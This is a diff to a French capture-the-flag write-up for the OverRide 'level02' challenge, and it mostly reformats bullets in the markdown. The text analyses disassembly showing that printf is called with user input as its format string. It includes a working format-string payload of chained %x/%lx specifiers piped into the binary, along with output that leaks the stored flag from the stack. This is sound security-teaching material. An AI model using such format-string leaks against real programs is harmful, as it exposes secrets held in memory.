@@ -181,7 +181,7 @@ End of assembler dump.
 
 > `0x400bb0: "r"`
 
-- `fopen@plt` est appelé avec notre flag comme premier argument.
+> `fopen@plt` est appelé avec notre flag comme premier argument.
 
 ```
    0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax
@@ -192,7 +192,7 @@ End of assembler dump.
    0x00000000004008fe <+234>:   mov    %rax,%rdi
    0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>
 ```
-- Le flag est stocké en `-0xa0(%rbp)`.
+> Le flag est stocké en `-0xa0(%rbp)`.
 
 ```
    0x00000000004009c3 <+431>:   mov    0x20087e(%rip),%rax
@@ -202,7 +202,7 @@ End of assembler dump.
    0x00000000004009d6 <+450>:   mov    %rax,%rdi
    0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt>
 ```
-- `<fgets@plt>` est appelé pour 0x64 octets avec un buffer situé à `-0x70(%rbp)`.
+> `<fgets@plt>` est appelé pour 0x64 octets avec un buffer situé à `-0x70(%rbp)`.
 
 ```
    0x0000000000400a4a <+566>:   lea    -0x110(%rbp),%rcx
@@ -220,14 +220,16 @@ End of assembler dump.
    0x0000000000400a9d <+649>:   mov    $0x0,%eax
    0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
 ```
-- Dans le cas où le mot de passe ne correspond pas à notre flag, `<printf@plt>` est appelé avec notre buffer comme premier argument, du coup:
+> Dans le cas où le mot de passe ne correspond pas à notre flag, `<printf@plt>` est appelé avec notre buffer comme premier argument
+
+- `<printf@plt>` est appelé avec notre buffer comme premier argument, du coup:
 ```
 level02@OverRide:~$ echo -ne "ABCD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %lx %lx %lx %lx %lx %x %x" | ./level02
 ...
 ABCD ffffe500 0 0 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 0 0 0 0 0 0 0 0 0 0 0 0 0 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 44434241 does not have access!
 ```
 
-- 44434241 est la valeur hexadécimale de ABCD, c'est le début de notre buffer. Ce que l'on peut voir juste avant le début de notre buffer est en fait notre flag car notre buffer est stocké juste après notre flag dans la pile.
+- 44434241 est la valeur hexadécimale de ABCD, c'est le début de notre buffer. Ce que l'on peut voir juste avant le début de notre buffer est en fait notre flag car notre buffer est stocké juste après notre flag dans la stack.
 
 | Hex | ASCII (little endian) | ASCII (big endian) |
 |-|-|-|
